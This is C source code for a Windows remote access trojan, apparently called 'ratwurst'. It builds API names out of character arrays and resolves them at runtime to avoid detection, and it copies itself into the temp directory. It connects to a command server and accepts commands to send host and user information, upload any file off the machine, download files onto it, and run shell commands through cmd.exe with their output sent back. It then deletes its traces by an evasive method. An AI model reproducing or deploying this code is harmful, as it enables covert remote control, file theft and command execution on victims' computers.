#include <winsock2.h>
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include "ratwurst.h"
#include "tools.cpp"

#define global static

global HMODULE gLibraryKernel32;
global _recv* gf_recv;
global _CreateFileA* gf_CreateFileA;
global _CloseHandle* gf_CloseHandle;

struct RATSocket
{
	HMODULE libraryWinsock2;
	SOCKET socketConnection;
	_WSAGetLastError *f_WSAGetLastError;	
};

int
SocketSend(RATSocket* ratSocket, char*
		   messageBuffer, unsigned int bufferSize)
{
	char ca_send[] = { 's','e','n','d', 0};
	_send* f_send = (_send*)GetProcAddress(ratSocket->libraryWinsock2, ca_send);
	if ( f_send(ratSocket->socketConnection, messageBuffer, bufferSize, 0) == SOCKET_ERROR )
	{
#if DEBUG		
		char buffer[SOCKET_BUFFER_SIZE];
		sprintf_s(buffer, "Socket failed with error: %ld\n", ratSocket->f_WSAGetLastError());
		OutputDebugStringA(buffer);
#endif		
		return 1;
	}
	return 0;
}

int
FetchInfo(RATSocket* ratSocket)
{
#if DEBUG	
	char bufferError[SOCKET_BUFFER_SIZE];
#endif	
	char bufferUser[UNLEN + 1];
	DWORD len = sizeof(bufferUser);

	char ca_unknown[] = { 'u','n','k','n','o','w','n', 0 };
	char bufferComputer[MAX_COMPUTERNAME_LENGTH + 1];
	len = sizeof(bufferComputer);
			
	char ca_GetComputerNameA[] = { 'G','e','t','C','o','m','p','u','t','e','r','N','a','m','e','A',0 };
	_GetComputerNameA* f_GetComputerNameA = (_GetComputerNameA*)GetProcAddress(gLibraryKernel32, ca_GetComputerNameA);
			
	if ( f_GetComputerNameA(bufferComputer, &len) <= 0 )
	{
#if DEBUG		
		sprintf_s(bufferError, "Could not get computer name: %ld\n", GetLastError());
		OutputDebugStringA(bufferError);
#endif

		strncpy_s(bufferComputer, ca_unknown, sizeof(ca_unknown));
	}

	char ca_advapi32[] = { 'A','d','v','a','p','i','3','2','.','d','l','l',0 };
	HMODULE libraryAdvapi32 = LoadLibraryA(ca_advapi32);
	if ( !libraryAdvapi32 )
	{
#if DEBUG				
		OutputDebugStringA("Loading libraryAdvapi32 failed.\n");
#endif		
		return 1;
	}
			
	char ca_GetUserNameA[] = { 'G','e','t','U','s','e','r','N','a','m','e','A',0 };
	_GetUserNameA* f_GetUserNameA = (_GetUserNameA*)GetProcAddress(libraryAdvapi32, ca_GetUserNameA);

	if ( f_GetUserNameA(bufferUser, &len) <= 0 )
	{
#if DEBUG		
		sprintf_s(bufferError, "Could not get username: %ld\n", GetLastError());
		OutputDebugStringA(bufferError);
#endif		

		strncpy_s(bufferUser, ca_unknown, sizeof(ca_unknown));
	}

	char bufferInfo[SOCKET_BUFFER_SIZE];
	sprintf_s(bufferInfo, "%s:%s", bufferComputer, bufferUser);
	SocketSend(ratSocket, bufferInfo, (unsigned int)strlen(bufferInfo));

	return 0;
}

int
DownloadFile(RATSocket* ratSocket,
			 char* splittedCommand[SPLIT_STRING_ARRAY_SIZE])
{
	char* totalReceivedData = NULL;
	int totalBytesRead = 0;
			
	char fileSizeBuffer[FILE_SIZE_DIGIT_SIZE] = {};
	if ( gf_recv(ratSocket->socketConnection, fileSizeBuffer, FILE_SIZE_DIGIT_SIZE, 0) != SOCKET_ERROR )
	{
		int fileSize = atoi(fileSizeBuffer);

		totalReceivedData = (char*)calloc(fileSize + 1, sizeof(char));
				
		for (;;)
		{
			char writeBuffer[SOCKET_BUFFER_SIZE] = {};
			int bytesRead = gf_recv(ratSocket->socketConnection, writeBuffer, SOCKET_BUFFER_SIZE, 0);
			if ( bytesRead != SOCKET_ERROR )
			{
#if DEBUG						
				OutputDebugStringA(writeBuffer);
#endif				

				strncat_s(totalReceivedData, fileSize + 1, writeBuffer, bytesRead);

				totalBytesRead += bytesRead;
				if ( totalBytesRead >= fileSize )
				{
					break;
				}
			}
			else
			{
#if DEBUG				
				OutputDebugStringA("[ERROR] Error receiving download command from server.");
#endif				
			}
		}
	}
	else
	{
		OutputDebugStringA("[ERROR] Error getting file size.");
	}

	OutputDebugStringA(totalReceivedData);

	HANDLE fileHandle = gf_CreateFileA(splittedCommand[1], GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if ( fileHandle == INVALID_HANDLE_VALUE )
	{
		OutputDebugStringA("Error");
	}

	DWORD bytesWritten;

	char ca_WriteFile[] = { 'W','r','i','t','e','F','i','l','e',0 };
	_WriteFile* f_WriteFile = (_WriteFile*)GetProcAddress(gLibraryKernel32, ca_WriteFile);
	f_WriteFile(fileHandle, totalReceivedData, totalBytesRead, &bytesWritten, 0);

#if DEBUG			
	char buffer[256];
	sprintf_s(buffer, "Bytes written: %ld\n", bytesWritten);
	OutputDebugStringA(buffer);
#endif	
	
	gf_CloseHandle(fileHandle);
			
	free(totalReceivedData);

	return 0;
}

int
UploadFile(RATSocket* ratSocket,
		   char* filePath)
{
	FILE* fs;
	errno_t errorNo = fopen_s(&fs, filePath, "rb");
	if ( errorNo == 0 )
	{
		for(;;)
		{
			char readBuffer[SOCKET_BUFFER_SIZE] = {};
			size_t readSize = fread(&readBuffer, 1, SOCKET_BUFFER_SIZE, fs);
			if ( readSize > 0 )
			{
				SocketSend(ratSocket, readBuffer, SOCKET_BUFFER_SIZE);
#if DEBUG						
				OutputDebugStringA(readBuffer);
				OutputDebugStringA("\n");
#endif				
			}
			if ( readSize < SOCKET_BUFFER_SIZE || feof(fs) )
			{
				SocketSend(ratSocket, "0", 1);
				break;
			}
		}
		fclose(fs);
		return 0;
	}
	else
	{
		OutputDebugString("[ERROR] Error opening file.\n");
		SocketSend(ratSocket, "0", 1);
		return 1;
	}
}

int
ReceiveCmdCommand(RATSocket* ratSocket,
				  char* splittedCommand[SPLIT_STRING_ARRAY_SIZE])
{
	PROCESS_INFORMATION pi;
	STARTUPINFO si = { };
	si.cb = sizeof(si);

	char cmdPath[MAX_PATH+8];

	char ca_GetSystemDirectoryA[] = { 'G','e','t','S','y','s','t','e','m','D','i','r','e','c','t','o','r','y','A',0 };
	_GetSystemDirectoryA* f_GetSystemDirectoryA = (_GetSystemDirectoryA*)GetProcAddress(gLibraryKernel32, ca_GetSystemDirectoryA);
	f_GetSystemDirectoryA(cmdPath, MAX_PATH);

	char ca_cmdexe[] = { '\\','c','m','d','.','e','x','e',0 };
	strncat_s(cmdPath, ca_cmdexe, 8);

	char tempPath[MAX_PATH];

	char ca_GetTempPathA[] = { 'G','e','t','T','e','m','p','P','a','t','h','A',0 };
	_GetTempPathA* f_GetTempPathA = (_GetTempPathA*)GetProcAddress(gLibraryKernel32, ca_GetTempPathA);
	f_GetTempPathA(MAX_PATH, tempPath);

	char cmdArg[MAX_PATH + 8 + 3 + sizeof(tempPath)] = { '/','C',' ',0 };

	int commandIndex = 1;
	while ( splittedCommand[commandIndex] != NULL )
	{
		strncat_s(cmdArg, splittedCommand[commandIndex], sizeof(splittedCommand[commandIndex]));
		strncat_s(cmdArg, " ", 1);
		commandIndex++;
	}

	char randomFileName[11] = {};
	GenerateRandomString(randomFileName, 6);
	strncat_s(randomFileName, ".tmp", 4);

	char filePath[MAX_PATH];
	strncpy_s(filePath, MAX_PATH, tempPath, strlen(tempPath));
	strncat_s(filePath, randomFileName, 10);

	strncat_s(cmdArg, " > ", 3);
	strncat_s(cmdArg, filePath, strlen(tempPath) + 10);

	char ca_CreateProcessA[] = { 'C','r','e','a','t','e','P','r','o','c','e','s','s','A',0 };
	_CreateProcessA* f_CreateProcessA = (_CreateProcessA*)GetProcAddress(gLibraryKernel32, ca_CreateProcessA);
	if ( !f_CreateProcessA(cmdPath, cmdArg, NULL, NULL, FALSE, 0 , NULL, NULL, &si, &pi) )
	{
#if DEBUG				
		char bufferError[256];
		sprintf_s(bufferError, "CreateProcess failed (%d).\n", GetLastError());
		OutputDebugStringA(bufferError);
#endif		
	}

	char ca_WaitForSingleObject[] = { 'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t',0 };
	_WaitForSingleObject* f_WaitForSingleObject = (_WaitForSingleObject*)GetProcAddress(gLibraryKernel32, ca_WaitForSingleObject);
	f_WaitForSingleObject( pi.hProcess, INFINITE );

	gf_CloseHandle(pi.hProcess);
	gf_CloseHandle(pi.hThread);

	UploadFile(ratSocket, filePath);

	// Alternative way to delete the temporary file. More info here: https://github.com/vxunderground/WinAPI-Tricks/blob/main/Kernel32/DeleteFileAlt/DeleteFileAltA.c
	HANDLE handle = gf_CreateFileA(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
	if ( handle == INVALID_HANDLE_VALUE )
	{
#if DEBUG		
		OutputDebugStringA("Error deleting file at");
		OutputDebugStringA(filePath);
#endif		
	}
	gf_CloseHandle(handle);

	return 0;
}

int CALLBACK
WinMain(HINSTANCE hInstance,
		HINSTANCE hPrevInstance,
		LPSTR lpCmdLine,
		int nCmdShow)
{
	char ca_kernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
	gLibraryKernel32 = LoadLibraryA(ca_kernel32);
	
	char currentPath[MAX_PATH];
	if ( GetModuleFileNameA(NULL, currentPath, MAX_PATH) == 0 )
	{
#if DEBUG
		OutputDebugStringA("Failed getting the module file name.");
#endif		
	}

	char tempPath[MAX_PATH];

	char ca_GetTempPathA[] = { 'G','e','t','T','e','m','p','P','a','t','h','A',0 };
	_GetTempPathA* f_GetTempPathA = (_GetTempPathA*)GetProcAddress(gLibraryKernel32, ca_GetTempPathA);
	f_GetTempPathA(MAX_PATH, tempPath);

	char newPath[MAX_PATH + 9];
	strncpy_s(newPath, MAX_PATH, tempPath, strlen(tempPath));
	strncat_s(newPath, "rtwst.tmp", 9);

	char ca_CopyFileA[] = { 'C','o','p','y','F','i','l','e','A',0 };
	_CopyFileA* f_CopyFileA = (_CopyFileA*)GetProcAddress(gLibraryKernel32, ca_CopyFileA);
	if ( f_CopyFileA == NULL )
	{
#if DEBUG
		char buffer[256];
		sprintf_s(buffer, "Failure in getting CopyFileA using GetProcAddress: %d\n", GetLastError());
		OutputDebugStringA(buffer);
#endif		
	}
	
	if ( f_CopyFileA(currentPath, newPath, 0) == 0 )
	{
#if DEBUG
		char buffer[256];
		sprintf_s(buffer, "Failure in copying the file: %d\n", GetLastError());
		OutputDebugStringA(buffer);
#endif		
	}
	
	return 0;
	
	UNREFERENCED_PARAMETER(hInstance);
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);
	UNREFERENCED_PARAMETER(nCmdShow);
	
	srand( (unsigned)time( NULL ) );
	
	RATSocket ratSocket = {};
	
	char ca_ws2_32[] = {'W','s','2','_','3','2','.','d','l','l', 0};
	ratSocket.libraryWinsock2 = LoadLibraryA(ca_ws2_32);
	if ( !ratSocket.libraryWinsock2 )
	{
#if DEBUG				
		OutputDebugStringA("Loading ratSocket.libraryWinsock2 failed.\n");
#endif		
		return 1;
	}

	char ca_WSAGetLastError[] = { 'W','S','A','G','e','t','L','a','s','t','E','r','r','o','r', 0 };
	char ca_WSAStartup[] = { 'W','S','A','S','t','a','r','t','u','p',0 };
	ratSocket.f_WSAGetLastError = (_WSAGetLastError*)GetProcAddress(ratSocket.libraryWinsock2, ca_WSAGetLastError);

	char ca_CloseHandle[] = { 'C','l','o','s','e','H','a','n','d','l','e',0 };
	gf_CloseHandle = (_CloseHandle*)GetProcAddress(gLibraryKernel32, ca_CloseHandle);
	
	for(;;)
	{
		WSADATA wsaData;

		_WSAStartup* f_WSAStartup = (_WSAStartup*)GetProcAddress(ratSocket.libraryWinsock2, ca_WSAStartup);
		if ( f_WSAStartup(MAKEWORD(2,2), &wsaData) != NO_ERROR )
		{
#if DEBUG					
			OutputDebugStringA("WSAStartup failed.\n");
#endif			
			return 1;
		}

		char ca_socket[] = { 's','o','c','k','e','t',0 };
		_socket* f_socket = (_socket*)GetProcAddress(ratSocket.libraryWinsock2, ca_socket);

		ratSocket.socketConnection = f_socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if ( ratSocket.socketConnection == INVALID_SOCKET )
		{
#if DEBUG					
			char buffer[256];
			sprintf_s(buffer, "Socket failed with error: %ld\n", ratSocket.f_WSAGetLastError());
			OutputDebugStringA(buffer);
#endif			

			char ca_WSACleanup[] = { 'W','S','A','C','l','e','a','n','u','p',0 };
			_WSACleanup* f_WSACleanup = (_WSACleanup*)GetProcAddress(ratSocket.libraryWinsock2, ca_WSACleanup);
			f_WSACleanup();
			return 1;
		}

		char ca_htons[] = { 'h','t','o','n','s',0 };
		char ca_inet_addr[] = { 'i','n','e','t','_','a','d','d','r',0 };
	
		_htons* f_htons = (_htons*)GetProcAddress(ratSocket.libraryWinsock2, ca_htons);
		_inet_addr* f_inet_addr = (_inet_addr*)GetProcAddress(ratSocket.libraryWinsock2, ca_inet_addr);

		char ca_ip_addr[] = { '1','2','7','.','0','.','0','.','1', 0 };
 
		struct sockaddr_in socketAddress;
		socketAddress.sin_family = AF_INET;
		socketAddress.sin_port = f_htons(65432);
		socketAddress.sin_addr.s_addr = f_inet_addr(ca_ip_addr);

		char ca_connect[] = { 'c','o','n','n','e','c','t', 0};
		_connect* f_connect = (_connect*)GetProcAddress(ratSocket.libraryWinsock2, ca_connect);

		if ( f_connect(ratSocket.socketConnection, (SOCKADDR*) &socketAddress, sizeof(socketAddress)) != SOCKET_ERROR )
		{
#if DEBUG					
			OutputDebugStringA("Connection successful!\n");
#endif			
			break;
		}
		else
		{
#if DEBUG					
			char buffer[256];
			sprintf_s(buffer, "Socket failed with error: %ld\nReconnecting...\n", ratSocket.f_WSAGetLastError());
			OutputDebugStringA(buffer);
#endif			

			// Try to reconnect
			// 
			char ca_closesocket[] = { 'c','l','o','s','e','s','o','c','k','e','t',0 };
			_closesocket* f_closesocket = (_closesocket*)GetProcAddress(ratSocket.libraryWinsock2, ca_closesocket);
			f_closesocket(ratSocket.socketConnection);

			char ca_WSACleanup[] = { 'W','S','A','C','l','e','a','n','u','p',0 };
			_WSACleanup* f_WSACleanup = (_WSACleanup*)GetProcAddress(ratSocket.libraryWinsock2, ca_WSACleanup);
			f_WSACleanup();
			
			Sleep(10000);
		}
	}

	SocketSend(&ratSocket, "login", 5);

	char ca_recv[] = { 'r','e','c','v', 0 };
	gf_recv = (_recv*)GetProcAddress(ratSocket.libraryWinsock2, ca_recv);

	//char ca_kernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };

	gLibraryKernel32 = LoadLibraryA(ca_kernel32);
	if ( !gLibraryKernel32 )
	{
#if DEBUG				
		OutputDebugStringA("Loading gLibraryKernel32 failed.\n");
#endif		
		return 1;
	}

	char ca_CreateFileA[] = { 'C','r','e','a','t','e','F','i','l','e','A',0 };
	gf_CreateFileA = (_CreateFileA*)GetProcAddress(gLibraryKernel32, ca_CreateFileA);
	
	for(;;)
	{
		char recvBuffer[SOCKET_BUFFER_SIZE] = {};
		if ( gf_recv(ratSocket.socketConnection, recvBuffer, SOCKET_BUFFER_SIZE, 0) == SOCKET_ERROR )
		{
#if DEBUG					
			OutputDebugStringA("Error receiving message.");
#endif			
		}

#if DEBUG				
		OutputDebugStringA("Received command: ");
#endif		
		char ca_info[] = { 'i','n','f','o',0 };
		char ca_cmd[] = { 'c','m','d',0 };
		char ca_shutdown[] = { 's','h','u','t','d','o','w','n',0 };
		char ca_upload[] = { 'u','p','l','o','a','d',0 };
		char ca_download[] = { 'd','o','w','n','l','o','a','d',0 };

		char* splittedCommand[SPLIT_STRING_ARRAY_SIZE] = {};
		SplitString(recvBuffer, splittedCommand, " ");
		
		if ( strcmp(splittedCommand[0], ca_info) == 0 )
		{
			FetchInfo(&ratSocket);
		}
		else if ( strcmp(splittedCommand[0], ca_upload) == 0 )
		{
			UploadFile(&ratSocket, splittedCommand[1]);
		}
		else if ( strcmp(splittedCommand[0], ca_download) == 0 )
		{
			DownloadFile(&ratSocket, splittedCommand);
		}
		else if ( strcmp(splittedCommand[0], ca_cmd) == 0 )
		{
			ReceiveCmdCommand(&ratSocket, splittedCommand);
		}
		else if ( strcmp(splittedCommand[0], ca_shutdown) == 0 )
		{
#if DEBUG					
			OutputDebugStringA("Received shutdown command.\n");
#endif			
			break;
		}
		else
		{
#if DEBUG					
			OutputDebugStringA("[WARNING] Unrecognized command: ");
			OutputDebugStringA(recvBuffer);
			OutputDebugStringA("\n");
#endif			
			
			break;
		}
		OutputDebugStringA("\n");
		Sleep(3000);
	}

#if DEBUG			
	OutputDebugStringA("Shutting down...");
#endif	
	
	char ca_closesocket[] = { 'c','l','o','s','e','s','o','c','k','e','t',0 };
	_closesocket* f_closesocket = (_closesocket*)GetProcAddress(ratSocket.libraryWinsock2, ca_closesocket);
	f_closesocket(ratSocket.socketConnection);

	char ca_WSACleanup[] = { 'W','S','A','C','l','e','a','n','u','p',0 };
	_WSACleanup* f_WSACleanup = (_WSACleanup*)GetProcAddress(ratSocket.libraryWinsock2, ca_WSACleanup);
	f_WSACleanup();
	
	return 0;
}
